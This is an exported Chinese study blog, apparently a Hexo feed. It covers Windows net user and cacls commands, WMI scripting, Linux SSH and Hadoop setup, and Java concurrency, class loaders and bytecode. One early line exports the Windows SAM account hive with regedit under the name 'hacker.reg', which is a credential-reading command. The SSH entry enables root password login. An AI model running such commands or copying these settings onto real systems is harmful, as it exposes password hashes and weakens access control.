    <content type="text"><![CDATA[组的创建和管理net user 显示所有用户net localgroup 显示所有组net user test 123 /add 创建用户net localgroup test /add 创建组 Cacls工具Cacls filename [/T] [/E] [/C] [/G usererm] [/R user […]] [/P usererm […]] [/D user […]]/T:更改当前目录及其所有子目录中指定文件的ACL/E:编辑ACL而不替换/C:在出现拒绝访问错误时继续/G:Userer:perm:赋予指定用户访问权限，Perm代表不同级别的访问权限,其值可以是R(读取)，W(写入)，C(更改，写入),F(完全控制)/R user:撤销指定用户的访问权限，注意该参数仅在与”/E”一起使用时有效。/P user:perm:替换指定用户的访问权限，perm的含义同前。/D user：拒绝指定用户的访问 regedit工具regedit.exe /e hacker.reg HKEY_LOCAL_MACHINE\SAM\SAM\Domains\account\users]]></content>
      <categories>
        <category>Windows</category>
      </categories>
      <tags>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[可见性，原子性，有序性]]></title>
    <url>%2F2017%2F05%2F25%2Ffirst%2F</url>
    <content type="text"><![CDATA[可见性可见性，是指线程之间的可见性，一个线程修改的状态对另一个线程是可见的。用volatile修饰的变量，就会具有可见性。volatile修饰的变量不允许线程内部缓存和重排序，即直接修改内存。所以对其他线程是可见的。但是这里需要注意一个问题，volatile只能让被他修饰内容具有可见性，但不能保证它具有原子性。比如 volatile int a = 0；之后有一个操作 a++；这个变量a具有可见性，但是a++ 依然是一个非原子操作，也就是这个操作同样存在线程安全问题。 原子性原子是世界上的最小单位，具有不可分割性。比如 a=0；（a非long和double类型） 这个操作是不可分割的，那么我们说这个操作时原子操作。再比如：a++； 这个操作实际是a = a + 1；是可分割的，所以他不是一个原子操作。非原子操作都会存在线程安全问题，需要我们使用同步技术（sychronized）来让它变成一个原子操作。一个操作是原子操作，那么我们称它具有原子性。java的concurrent包下提供了一些原子类，我们可以通过阅读API来了解这些原子类的用法。 有序性Java 语言提供了 volatile 和 synchronized 两个关键字来保证线程之间操作的有序性，volatile 是因为其本身包含“禁止指令重排序”的语义，synchronized 是由“一个变量在同一个时刻只允许一条线程对其进行 lock 操作”这条规则获得的，此规则决定了持有同一个对象锁的两个同步块只能串行执行。 Volatile原理volatile变量，用来确保将变量的更新操作通知到其他线程。。当把变量声明为volatile类型后，编译器与运行时都会注意到这个变量是共享的，因此不会将该变量上的操作与其他内存操作一起重排序。volatile变量不会被缓存在寄存器或者对其他处理器不可见的地方，因此在读取volatile类型的变量时总会返回最新写入的值。在访问volatile变量时不会执行加锁操作，因此也就不会使执行线程阻塞，因此volatile变量是一种比sychronized关键字更轻量级的同步机制。当对非 volatile 变量进行读写的时候，每个线程先从内存拷贝变量到CPU缓存中。如果计算机有多个CPU，每个线程可能在不同的CPU上被处理，这意味着每个线程可以拷贝到不同的 CPU cache 中。 而声明变量是 volatile 的，JVM 保证了每次读变量都从内存中读，跳过 CPU cache 这一步。当一个变量定义为 volatile 之后，将具备两种特性： 1.保证此变量对所有的线程的可见性，这里的“可见性”，如本文开头所述，当一个线程修改了这个变量的值，volatile 保证了新值能立即同步到主内存，以及每次使用前立即从主内存刷新。但普通变量做不到这点，普通变量的值在线程间传递均需要通过主内存（详见：Java内存模型）来完成。 2.禁止指令重排序优化。有volatile修饰的变量，赋值后多执行了一个“load addl $0x0, (%esp)”操作，这个操作相当于一个内存屏障（指令重排序时不能把后面的指令重排序到内存屏障之前的位置），只有一个CPU访问内存时，并不需要内存屏障；（什么是指令重排序：是指CPU采用了允许将多条指令不按程序规定的顺序分开发送给各相应电路单元处理）。]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[WMI系列]]></title>
    <url>%2F2017%2F05%2F24%2Ffirst%2F</url>
    <content type="text"><![CDATA[vbs脚本运行 cscript 1.vbs托管资源WMI基础结构使用者托管资源托管资源是任意逻辑或物理组件，通过使用 WMI 进行公开和管理。可以使用 WMI 管理的 Windows 资源包括：计算机系统、磁盘、外围设备、事件日志、文件、文件夹、文件系统、网络组件、操作系统子系统、性能计数器、打印机、进程、注册表设置、安全性、服务、共享、SAM 用户和组、Active Directory、Windows 安装程序、Windows 驱动程序模式 (WDM) 设备驱动程序，以及 SNMP 管理信息基 (MIB) 数据等。WMI 托管资源通过一个提供程序与 WMI 通讯。当开始编写脚本来与 WMI 托管资源交互时，您经常会看到一个术语实例，它被用于引用在运行中的脚本中的托管资源的虚拟表示形式。WMI 基础结构中间层是 WMI 基础结构。WMI 由三个主要组件构成：公共信息模型对象管理器（Common Information Model Object Manager，CIMOM）、公共信息模型（Common Information Model，CIM）储存库，以及提供程序。这三个 WMI 组件共同提供通过其定义、公开、访问和检索配置和管理数据的基础结构。虽然小，但是对编写脚本来说绝对不可或缺的第四个组件是 WMI 脚本库。WMI 提供程序WMI 提供程序在 WMI 和托管资源之间扮演着中间方的角色。提供程序代表使用者应用程序和脚本从 WMI 托管资源请求信息，并发送指令到 WMI 托管资源。例如，清单 1 和清单 2 使用内置 Win32 提供程序来检索内存和服务相关信息。清单 3 使用内置的事件日志提供程序来从 Windows 事件日志检索记录。通过将托管资源公开给基于 WMI 标准的、统一访问模型的 WMI 基础结构，提供程序隐藏托管资源独有的实现详细信息。WMI 提供程序使用托管资源本机 API 与其相应的托管资源通讯，使用 WMI 编程接口与 CIMOM 通讯。例如，内置的事件日志提供程序调用 Win32 事件日志 API 来访问事件日志。基于 WMI 的可扩展体系结构，软件开发人员可以开发并集成附加提供程序来公开其产品特有的管理函数。监视 Exchange 连接器状态的 Exchange Server 2000 提供程序就是一个这样的示例。同样，Application Center、Operations Manager、Systems Management Server、Internet Information Server 和 SQL Server 都包含 WMI 提供程序。提供程序通常作为驻留在 %SystemRoot%/system32/wbem 目录中的动态链接库 (DLL) 实现。WMI 包括很多针对Windows 2000、Windows XP 以及 Windows Server 2003 系列操作系统的内置提供程序。内置提供程序（也被称为标准提供程序），从已知的操作系统源（如 Win32 子系统、事件日志、性能计数器、注册表等）提供数据和管理函数。表 1 中列出一些包含在 Windows 2000、Windows XP 和 Windows Server 2003 系列操作系统中的 WMI 提供程序。提供注册。WMI 利用 CIMOM 提供注册位置和功能信息。此信息存储在 CIM 储存库中。请求传送。CIMOM 使用提供程序注册信息，将使用者请求传送到合适的提供程序。远程访问。使用者通过连接到远程系统上的 CIMOM 访问启用 WMI 的远程系统。一旦连接建立，使用者可以执行与在本地可以执行的操作相同的操作。安全性。在本地计算机或是远程计算机上，允许用户在连接到 WMI 之前通过验证每个用户的访问标记，CIMOM 控制对 WMI 托管资源的访问。WMI 并不覆盖或阻止由操作系统提供的安全性。查询处理。允许使用者使用 WMI 查询语言（WMI Query Language，WQL）发出关于任何 WMI 托管资源的查询。例如，您可以查询所有发生在过去 24 小时的，符合一个特定事件 ID 的事件的事件日志。CIMOM 只在提供程序本身不支持查询操作的情况下执行查询计算。事件处理。允许使用者订阅表示对 WMI 托管资源更改的事件。例如，您可以订阅表明逻辑磁盘驱动器上的空间何时下降到可接受的阈值以下的事件。CICOM 按一个指定的间隔轮询托管资源，并在满足订阅条件时生成一个事件通知。 查看Windows类命令行输入 wbemtest然后点击连接到root\cimv2然后递归枚举类，查看所有类及方法。123456strComputer = "HACK"Set objWMIService = GetObject("winmgmts:\\" &amp; strComputer)Set colOperatingSystems = objWMIService.InstancesOf("Win32_OperatingSystem")For Each objOperatingSystem In colOperatingSystems WScript.Echo "Name:" &amp; objOperatingSystem.NameNext]]></content>
      <categories>
        <category>安全</category>
      </categories>
      <tags>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux问题解决(一)]]></title>
    <url>%2F2017%2F05%2F22%2Ffirst%2F</url>
    <content type="text"><![CDATA[SSH服务拒绝了密码用Xshell root连接时显示ssh服务器拒绝了密码，应该是应该是sshd的设置不允许root用户用密码远程登录修改 /etc/ssh/sshd_config文件，注意，安装了openssh才会有这个文件，如果文件不存在请检查是否安装了openssh。1vim /etc/ssh/sshd_config 找到1234# Authentication:LoginGraceTime 120PermitRootLogin prohibit-passwordStrictModes yes 改成1234# Authentication:LoginGraceTime 120PermitRootLogin yesStrictModes yes 然后输入命令1/etc/init.d/ssh restart 重启ssh服务即可 scp命令scp 文件 root@ip地址或主机名:/root/.ssh/ tar命令tar -zxf .tar.gz Linux的环境变量/etc/profile是系统级环境变量(对所有用户起作用)~./bashrc是用户级的环境变量(只对特定用户起作用)在文件中用export 环境变量名=来添加环境变量。source /etc/profile 在当前shell进程中使当前环境变量立刻起作用重启后环境变量生效。 Linux目录结构/etc 系统的配置环境/usr 用户的应用程序]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hadoop研究(一)]]></title>
    <url>%2F2017%2F05%2F22%2Fsecond%2F</url>
    <content type="text"><![CDATA[Hadoop节点Master:Namenode、Secondary、Namenode、Jobtracker。浏览器(用于观看 管理界面)，其它Hadoop工具Slave:Tasktracker、Datanode 三种运行模式单机模式:安装简单，几乎不用作任何配置，但权限于调试用途。伪分布模式:在单节点上同时启动namenode、datanode、jobtracker、tasktrack、secondary namenode等5个进程，模拟分布式运行的各个节点。完全分布式模式：正常的hadoop集群，由多个各司其职的节点构成。 安装部署namenode 192.168.83.130datanode 192.168.83.128datanode 192.168.83.131 ssh公钥私钥在.ssh目录，这个目录一般设置到需要登录的用户目录下的.ssh目录，使用ssh-keygen -t rsa 生成公钥密钥对。生成两个文件:私钥文件:id_rsa公钥文件:id_rsa.pub将公钥文件id_rsa.pub内容放到authorized_keys文件中:1cat id_rsa.pub &gt;&gt; authorized_keys 将公钥文件authorized_keys分发到各个主机上:1scp authorized_keys root@ip地址或主机名:/root/.ssh/ 即可无密码登录。]]></content>
      <categories>
        <category>大数据</category>
        <category>Hadoop</category>
      </categories>
      <tags>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[java 类加载器]]></title>
    <url>%2F2017%2F05%2F21%2Fsecond%2F</url>
    <content type="text"><![CDATA[基本概念加载器（class loader）用来加载 Java 类到 Java 虚拟机中。一般来说，Java 虚拟机使用 Java 类的方式如下：Java 源程序（.java 文件）在经过 Java 编译器编译之后就被转换成 Java 字节代码（.class 文件）。类加载器负责读取 Java 字节代码，并转换成 java.lang.Class类的一个实例。每个这样的实例用来表示一个 Java 类。通过此实例的 newInstance()方法就可以创建出该类的一个对象。实际的情况可能更加复杂，比如 Java 字节代码可能是通过工具动态生成的，也可能是通过网络下载的。 ClassLoader类介绍java.lang.ClassLoader类的基本职责就是根据一个指定的类的名称，找到或者生成其对应的字节代码，然后从这些字节代码中定义出一个 Java 类，即 java.lang.Class类的一个实例。除此之外，ClassLoader还负责加载 Java 应用所需的资源，如图像文件和配置文件等。不过本文只讨论其加载类的功能。为了完成加载类的这个职责，ClassLoader提供了一系列的方法。 ClassLoader方法getParent() 返回该类加载器的父类加载器。loadClass(String name) 加载名称为 name的类，返回的结果是 java.lang.Class类的实例。findClass(String name) 查找名称为 name的类，返回的结果是 java.lang.Class类的实例。findLoadedClass(String name) 查找名称为 name的已经被加载过的类，返回的结果是 java.lang.Class类的实例。defineClass(String name, byte[] b, int off, int len) 把字节数组 b中的内容转换成 Java 类，返回的结果是 java.lang.Class类的实例。这个方法被声明为 final的。resolveClass(Class&lt;?&gt; c) 链接指定的 Java 类。 类加载器的树状组织结构Java 中的类加载器大致可以分成两类，一类是系统提供的，另外一类则是由 Java 应用开发人员编写的。系统提供的类加载器主要有下面三个：引导类加载器（bootstrap class loader）：它用来加载 Java 的核心库，是用原生代码来实现的，并不继承自 java.lang.ClassLoader。扩展类加载器（extensions class loader）：它用来加载 Java 的扩展库。Java 虚拟机的实现会提供一个扩展库目录。该类加载器在此目录里面查找并加载 Java 类。系统类加载器（system class loader）：它根据 Java 应用的类路径（CLASSPATH）来加载 Java 类。一般来说，Java 应用的类都是由它来完成加载的。可以通过 ClassLoader.getSystemClassLoader()来获取它。 演示类加载器的树状组织结构public class ClassLoaderTree { public static void main(String[] args) { ClassLoader loader = ClassLoaderTree.class.getClassLoader(); while (loader != null) { System.out.println(loader.toString()); loader = loader.getParent(); } } }每个 Java 类都维护着一个指向定义它的类加载器的引用，通过 getClassLoader()方法就可以获取到此引用。 演示类加载器的树状组织结构的运行结果sun.misc.Launcher$AppClassLoader@9304b1sun.misc.Launcher$ExtClassLoader@190d11第一个输出的是 ClassLoaderTree类的类加载器，即系统类加载器。它是 sun.misc.Launcher$AppClassLoader类的实例；第二个输出的是扩展类加载器，是 sun.misc.Launcher$ExtClassLoader类的实例。 类加载器的代理模式Class对象每个类在编译后都会产生一个Class对象，被保存在同名.class文件中。运行时，类加载器检查所需的类的Class对象是否已经加载，如果没有，就从.class文件中加载该类的Class对象，然后用该Class对象创建该类的所有对象。也就是说Class对象是我们写的类的原始对象，我们要通过它来创建新的实例。那么classloader就是一种类加载器，加载后会获得Class对象，进而产生实例。类加载器负责读取 Java 字节代码，并转换成 java.lang.Class类的一个实例。每个这样的实例用来表示一个 Java 类。通过此实例的 newInstance()方法就可以创建出该类的一个对象。 加载类的过程在前面介绍类加载器的代理模式的时候，提到过类加载器会首先代理给其它类加载器来尝试加载某个类。这就意味着真正完成类的加载工作的类加载器和启动这个加载过程的类加载器，有可能不是同一个。真正完成类的加载工作是通过调用 defineClass来实现的；而启动类的加载过程是通过调用 loadClass来实现的。前者称为一个类的定义加载器（defining loader），后者称为初始加载器（initiating loader）。在 Java 虚拟机判断两个类是否相同的时候，使用的是类的定义加载器。也就是说，哪个类加载器启动类的加载过程并不重要，重要的是最终定义这个类的加载器。两种类加载器的关联之处在于：一个类的定义加载器是它引用的其它类的初始加载器。如类 com.example.Outer引用了类 com.example.Inner，则由类 com.example.Outer的定义加载器负责启动类 com.example.Inner的加载过程。方法 loadClass()抛出的是 java.lang.ClassNotFoundException异常；方法 defineClass()抛出的是 java.lang.NoClassDefFoundError异常。类加载器在成功加载某个类之后，会把得到的 java.lang.Class类的实例缓存起来。下次再请求加载该类的时候，类加载器会直接使用缓存的类的实例，而不会尝试再次加载。也就是说，对于一个类加载器实例来说，相同全名的类只加载一次，即 loadClass方法不会被重复调用。类的加载指的是将类的.class文件中的二进制数据读入到内存中，将其放在运行时数据区的方法区内，然后在堆区创建一个这个类的Java.lang.Class对象，用来封装类在方法区类的对象。看下面2图类的加载的最终产品是位于堆区中的Class对象Class对象封装了类在方法区内的数据结构，并且向Java程序员提供了访问方法区内的数据结构的接口加载类的方式有以下几种：1）从本地系统直接加载2）通过网络下载.class文件3）从zip，jar等归档文件中加载.class文件4）从专有数据库中提取.class文件5）将Java源文件动态编译为.class文件（服务器） 线程上下文类加载器类 java.lang.Thread中的方法 getContextClassLoader()和 setContextClassLoader(ClassLoader cl)用来获取和设置线程的上下文类加载器。如果没有通过 setContextClassLoader(ClassLoader cl)方法进行设置的话，线程将继承其父线程的上下文类加载器。Java 应用运行的初始线程的上下文类加载器是系统类加载器。在线程中运行的代码可以通过此类加载器来加载类和资源。 Class.forName加载器Class.forName是一个静态方法，同样可以用来加载类。该方法有两种形式：Class.forName(String name, boolean initialize, ClassLoader loader)和 Class.forName(String className)。第一种形式的参数 name表示的是类的全名；initialize表示是否初始化类；loader表示加载时使用的类加载器。第二种形式则相当于设置了参数 initialize的值为 true，loader的值为当前类的类加载器。Class.forName的一个很常见的用法是在加载数据库驱动的时候。如 Class.forName(“org.apache.derby.jdbc.EmbeddedDriver”).newInstance()用来加载 Apache Derby 数据库的驱动。 开发自己的类加载器文件系统类加载器第一个类加载器用来加载存储在文件系统上的 Java 字节代码。1234567891011121314151617181920212223242526272829303132333435363738394041public class FileSystemClassLoader extends ClassLoader &#123; private String rootDir; public FileSystemClassLoader(String rootDir) &#123; this.rootDir = rootDir; &#125; protected Class&lt;?&gt; findClass(String name) throws ClassNotFoundException &#123; byte[] classData = getClassData(name); if (classData == null) &#123; throw new ClassNotFoundException(); &#125; else &#123; return defineClass(name, classData, 0, classData.length); &#125; &#125; private byte[] getClassData(String className) &#123; String path = classNameToPath(className); try &#123; InputStream ins = new FileInputStream(path); ByteArrayOutputStream baos = new ByteArrayOutputStream(); int bufferSize = 4096; byte[] buffer = new byte[bufferSize]; int bytesNumRead = 0; while ((bytesNumRead = ins.read(buffer)) != -1) &#123; baos.write(buffer, 0, bytesNumRead); &#125; return baos.toByteArray(); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; return null; &#125; private String classNameToPath(String className) &#123; return rootDir + File.separatorChar + className.replace('.', File.separatorChar) + ".class"; &#125; &#125; 类 FileSystemClassLoader的 findClass()方法首先根据类的全名在硬盘上查找类的字节代码文件（.class 文件），然后读取该文件内容，最后通过 defineClass()方法来把这些字节代码转换成 java.lang.Class类的实例。网络类加载器类 NetworkClassLoader负责通过网络下载 Java 类字节代码并定义出 Java 类。它的实现与 FileSystemClassLoader类似。在通过 NetworkClassLoader加载了某个版本的类之后，一般有两种做法来使用它。第一种做法是使用 Java 反射 API。另外一种做法是使用接口。需要注意的是，并不能直接在客户端代码中引用从服务器上下载的类，因为客户端代码的类加载器找不到这些类。使用 Java 反射 API 可以直接调用 Java 类的方法。而使用接口的做法则是把接口的类放在客户端中，从服务器上加载实现此接口的不同版本的类。在客户端通过相同的接口来使用这些实现类。 类何时初始化1）创建类的实例，也就是new一个对象2）访问某个类或接口的静态变量，或者对该静态变量赋值3）调用类的静态方法4）反射（Class.forName(“com.lyj.load”)）5）初始化一个类的子类（会首先初始化子类的父类）6）JVM启动时标明的启动类，即文件名和类名相同的那个类 类初始化步骤1）如果这个类还没有被加载和链接，那先进行加载和链接2）假如这个类存在直接父类，并且这个类还没有被初始化（注意：在一个类加载器中，类只能初始化一次），那就初始化直接的父类（不适用于接口）3)加入类中存在初始化语句（如static变量和static块），那就依次执行这些初始化语句。 ClassLoader加载JVM的类加载是通过ClassLoader及其子类来完成的，类的层次关系和加载顺序可以由下图来描述：1）Bootstrap ClassLoader负责加载\$JAVA_HOME中jre/lib/rt.jar里所有的class，由C++实现，不是ClassLoader子类2）Extension ClassLoader负责加载java平台中扩展功能的一些jar包，包括\$JAVA_HOME中jre/lib/*.jar或-Djava.ext.dirs指定目录下的jar包3）App ClassLoader负责记载classpath中指定的jar包及目录中class4）Custom ClassLoader属于应用程序根据自身需要自定义的ClassLoader，如tomcat、jboss都会根据j2ee规范自行实现ClassLoader加载过程中会先检查类是否被已加载，检查顺序是自底向上，从Custom ClassLoader到BootStrap ClassLoader逐层检查，只要某个classloader已加载就视为已加载此类，保证此类只所有ClassLoader加载一次。而加载的顺序是自顶向下，也就是由上层来逐层尝试加载此类。]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[java 字节码研究(一)]]></title>
    <url>%2F2017%2F05%2F21%2Ffirst%2F</url>
    <content type="text"><![CDATA[class类文件的结构class文件是一组以8位字节位基础单位的二进制流，采用一种类似c语言结构体的伪结构来存储数据，这种伪结构只有两种数据类型：无符号数和表。无符号数属于基本的数据类型，以u1、u2、u4、u8分别代表1个字节、2个字节、4个字节、8个字节的无符号数，无符号数可以用来描述数字、索引引用、数量值或utf-8编码构成的字符串值。表是由多个无符号数或其他表作为数据项构成的复合数据类型，所有表都习惯性地以_info结尾。 结构体1234567891011121314151617sFile &#123; u4 magic; //魔数 u2 minor_version; //副版本号 u2 major_version; //主版本号 u2 constant_pool_count; //常量池计数器， cp_info constant_pool[constant_pool_count-1]; //常量池列表 u2 access_flags; //访问标志 u2 this_class; //类索引，表示这个Class文件所定义的类或接口 u2 super_class; //父类索引 u2 interfaces_count; //接口计数器 u2 interfaces[interfaces_count]; //接口表，接口顺序和源代码顺序一致 u2 fields_count; //字段计数器 field_info fields[fields_count]; //字段表 u2 methods_count; //方法计数器 method_info methods[methods_count]; //方法表 u2 attributes_count; //属性计数器 attribute_info attributes[attributes_count]; //属性表 图示 示例建立一个类1234567891011121314151617package com.test.doc.exp;public class TestClassCode &#123; private String attribute_1; protected Integer attribute_2; public void testInterface_1() &#123; &#125; public String testInterface_2(String param) &#123; return param; &#125;&#125; TestClassCode.class对应的字节码如下：12345678910111213141516171819cafe babe 0000 0032 0018 0700 0201 001e 636f 6d2f 7465 7374 2f64 6f63 2f65 78702f54 6573 7443 6c61 7373 436f 6465 0700 0401 0010 6a61 7661 2f6c 616e 672f 4f626a65 6374 0100 0b61 7474 7269 6275 7465 5f31 0100 124c 6a61 7661 2f6c 616e 672f5374 7269 6e67 3b01 000b 6174 7472 6962 7574 655f 3201 0013 4c6a 6176 612f 6c616e67 2f49 6e74 6567 6572 3b01 0006 3c69 6e69 743e 0100 0328 2956 0100 0443 6f64650a 0003 000d 0c00 0900 0a01 000f 4c69 6e65 4e75 6d62 6572 5461 626c 6501 00124c6f 6361 6c56 6172 6961 626c 6554 6162 6c65 0100 0474 6869 7301 0020 4c63 6f6d2f74 6573 742f 646f 632f 6578 702f 5465 7374 436c 6173 7343 6f64 653b 0100 0f746573 7449 6e74 6572 6661 6365 5f31 0100 0f74 6573 7449 6e74 6572 6661 6365 5f320100 2628 4c6a 6176 612f 6c61 6e67 2f53 7472 696e 673b 294c 6a61 7661 2f6c 616e672f 5374 7269 6e67 3b01 0005 7061 7261 6d01 000a 536f 7572 6365 4669 6c65 01001254 6573 7443 6c61 7373 436f 6465 2e6a 6176 6100 2100 0100 0300 0000 0200 02000500 0600 0000 0400 0700 0800 0000 0300 0100 0900 0a00 0100 0b00 0000 2f00 01000100 0000 052a b700 0cb1 0000 0002 000e 0000 0006 0001 0000 0003 000f 0000 000c0001 0000 0005 0010 0011 0000 0001 0012 000a 0001 000b 0000 002b 0000 0001 00000001 b100 0000 0200 0e00 0000 0600 0100 0000 0b00 0f00 0000 0c00 0100 0000 01001000 1100 0000 0100 1300 1400 0100 0b00 0000 3600 0100 0200 0000 022b b000 00000200 0e00 0000 0600 0100 0000 0e00 0f00 0000 1600 0200 0000 0200 1000 1100 00000000 0200 1500 0600 0100 0100 1600 0000 0200 17 结构分析魔数class文件对应的字节码：cafe babe，每个class文件的头4个字节称为魔数（cafe babe），它的唯一作用是确定这个文件是否为一个能被虚拟机接受的class文件。版本号class文件对应的字节码：0000 0032，第5、6个字节是次版本号（minor_version），第7、8个字节是主版本号（major_version）。java的版本号是从45开始的，jdk1.1之后的每个jdk大版本发布主版本号向上＋1，高版本的jdk能向下兼容以前版本的class文件，但不能运行以后版本的class文件，即使文件格式发生任何变化，虚拟机也拒绝执行超过其版本号的class文件。本例中次版本号：0x0000，主版本号：0x0032，代表编译器使用jdk1.6.0_1版本。常量池计数器、数据区常量池是class文件中非常重要的结构，它描述着整个class文件的字面量信息，可以理解为class文件之中的资源仓库。常量池是由一组 constant_pool 结构体数组组成的，而数组的大小则由常量池计数器指定。常量池计数器 constant_pool_count 的值 =constant_pool表中的成员数 + 1。constant_pool表的索引值只有在大于 0 且小于 constant_pool_count时才会被认为是有效的。本例中常量池容量为0x0018，代表十进制数24，常量池中有23项常量，所以范围为1-23。在class文件格式规范制定之时，设计者将第0项常量空出来是有特殊考虑的，这样做的目的在于满足后面某些常量池的索引值的数据在特定情况下需要表达“不引用任何一个常量池项目”的含义，这种情况可以把索引值置为0来表示。 class文件结构中只有常量池的容量计数是从1开始 。接下来存储的是常量池数据区，主要存放两大类常量：字面量和符号引用，常量池中每一个常量都是一个表，共有14中不同结构的表结构数据： 类型 标志 CONSTANT_Utf8_info 1 CONSTANT_Integer_info 3 CONSTANT_Float_info 4 CONSTANT_Long_info 5 CONSTANT_Double_info 6 CONSTANT_Class_info 7 CONSTANT_String_info 8 CONSTANT_Fielddef_info 9 CONSTANT_Methoddef_info 10 CONSTANT_InterfaceMethoddef_info 11 CONSTANT_NameAndType_info 12 CONSTANT_MethodHandle_info 15 CONSTANT_MethodType_info 16 CONSTANT_InvokeDynamic_info 18 之所以说常量池是最繁琐的数据，是因为常见的11个常量各自均有自己的结构，见下图：以TestClassCode.java为例，格式化展示对应的常量区字节码：第一项常量值：0x07 0002，它的标志位是0x07，属于CONSTANT_Class_info，此类型代表一个类或接口的符号引用。0x0002，是它的符号引用，指向常量池的第二项常量。第二项常量值：0x01 001e 636f 6d2f 7465 7374 2f64 6f63 2f65 7870 2f54 6573 7443 6c61 7373 436f 6465 ，它的标志位是0x01，属于CONSTANT_Utf8_info，此类型代表一个UTF-8编码的字符串，长度为001e即十进制数30，字符串值为0x636f 6d2f 7465 7374 2f64 6f63 2f65 7870 2f54 6573 7443 6c61 7373 436f 6465，对应为：com/test/doc/exp/TestClassCode。以此方法，我们可以依次得到剩下的常量池数据区，当然也可以使用javap -verbose TestClassCode命令，输出TestClassCode.class对应的常量池区域：123456789101112131415161718192021222324Constant pool: #1 = Class #2 // com/test/doc/exp/TestClassCode #2 = Utf8 com/test/doc/exp/TestClassCode #3 = Class #4 // java/lang/Object #4 = Utf8 java/lang/Object #5 = Utf8 attribute_1 #6 = Utf8 Ljava/lang/String; #7 = Utf8 attribute_2 #8 = Utf8 Ljava/lang/Integer; #9 = Utf8 &lt;init&gt; #10 = Utf8 ()V #11 = Utf8 Code #12 = Methodref #3.#13 // java/lang/Object."&lt;init&gt;":()V #13 = NameAndType #9:#10 // "&lt;init&gt;":()V #14 = Utf8 LineNumberTable #15 = Utf8 LocalVariableTable #16 = Utf8 this #17 = Utf8 Lcom/test/doc/exp/TestClassCode; #18 = Utf8 testInterface_1 #19 = Utf8 testInterface_2 #20 = Utf8 (Ljava/lang/String;)Ljava/lang/String; #21 = Utf8 param #22 = Utf8 SourceFile #23 = Utf8 TestClassCode.java 访问标志常量池结束之后，紧接着的两个字节代表访问标志（access_flags），这个标志用于识别一些类或接口层次的访问信息。具体的标志位以及标志含义见下表：本例中访问标志为0x0021，它的ACC_PUBLIC，ACC_SUPER标志应当为真，而其他标志为假。 类索引、父类索引、接口索引集合类索引和父类索引都是一个u2类型的数据，而结构索引集合是一组u2类型的数据集合，class文件由这三项数据来确定这个类的父类的全限定名。对于接口索引集合的第一项是接口计数器，如果没有实现任何接口，该计数器为0。本例中，类索引对应0x0001，即类索引指向常量池第一个变量，常量池对应为CONSTANT_Class_info的类描述符常量，再通过该变量的索引值找到定义在CONSTANT_Utf8_info类型中的全限定名字符串com/test/doc/exp/TestClassCode。父类索引为0x0003，值为java/lang/Object。接口索引集合为0x0000，即当前不实现任何接口。 字段表集合字段表集合用于描述接口或类中声明的变量，是指由若干个字段表（field_info）组成的集合。对于在类中定义的若干个字段，经过JVM编译成class文件后，会将相应的字段信息组织到一个叫做字段表集合的结构中，字段表集合是一个类数组结构，会将类中定义的字段个数设到字段计数器中，然后每个字段信息组成一个field_info结构，依次存储到字段计数器之后。field_info结构如下：1234567struct field_info &#123;u2 access_flags;u2 name_index;u2 descriptor_index;u2 attributes_count;attribute_info attributes;&#125; access_flags是一个u2的数据类型，字段访问标志包括：ACC_PUBLIC、ACC_PRIVATE、ACC_PROTECTED、ACC_STATIC、ACC_FINAL、ACC_VOLATILE、ACC_TRANSIENT、ACC_SYNTHETIC、ACC_ENUM。跟随access_flags标志的是两个索引值：name_index和descriptor_index。他们都是对常量池的引用，分别代表字段的简单名称以及字段和方法的描述符。本例中字段表集合值对应0x0002 0002 0005 0006 0000 0004 0007 0008 0000，字段表计数器0x0002，代表当前类包含2个字段。access_flags对应0x0002，代表字段为private属性。name_index为0x0005，指向常量池第五个常量，即attribute_1。descriptor_index为0x0006，指向常量池第六个常量，即Ljava/lang/String; 。随后紧跟的0x0000代表该字段没有对应的属性。字段表集合中不会列出从超类或父接口中继承而来的字段，但由可能列出原本java代码中不存在的字段，譬如在内部类中为了保持对外部类的访问性，会自动添加指向外部类实例的字段。 方法表与属性表集合方法表集合是指由若干个方法表（method_info）组成的集合。对于在类中定义的若干个，经过JVM编译成class文件后，会将相应的method方法信息组织到一个叫做方法表集合的结构中，字段表集合是一个类数组结构，如下：1234struct method &#123;u2 method_counts;method_info[] method_infos;&#125; 方法表结构method_info如下:1234567struct method_info &#123;u2 access_flags;u2 name_index;u2 descriptor_index;u2 attributes_count;attribute_info attributes;&#125; 这个结构跟field_info结构几乎完全一致，但因为volatile关键字和transient关键字不能修饰方法，所以方法表中的访问标志没有了ACC_VOLATILE标志和ACC_TRANSIENT标志。与之相对的方法表中增加了ACC_SYNCHRONIZED、ACC_NATIVE、ACC_STRICTFP、ACC_ABSTRACT。 标志名称 标志值 含义 ACC_PUBLIC 0x0001 是否为public ACC_PRIVATE 0x0002 是否为private ACC_PROTECTED 0x0004 是否为protected ACC_STATIC 0x0008 是否为static ACC_FINAL 0x0010 是否为final ACC_SYNCHRONIZED 0x0020 是否为synchronized ACC_BRIDGE 0x0040 是否为编译器产生的桥接方法 ACC_VARARGS 0x0080 是否接受不定参数 ACC_NATIVE 0x0100 是否为native ACC_ABSTRACT 0x0400 是否为abstract ACC_STRICTFP 0x0800 是否为strictfp ACC_SYNTHETIC 0x1000 是否为编译器自动产生 方法的名称索引、描述索引与字段类似，方法里的代码经过编译器编译成字节码指令后，存放在方法属性表集合中。在Class文件，字段表，方法表中都可以携带自己的属性表集合，以用于描述某些场景专有的信息。与Class文件中其它的数据项目要求的顺序、长度和内容不同，属性表集合的限制稍微宽松一些，不再要求各个属性表具有严格的顺序，并且只要不与已有的属性名重复，任何人实现的编译器都可以向属性表中写入自己定义的属性信息，Java虚拟机运行时会忽略掉它不认识的属性。属性表的通用结构如下：12345struct attribute_info &#123;u2 attribute_name_index;u4 attribute_length;u1 info[attribute_length];&#125; 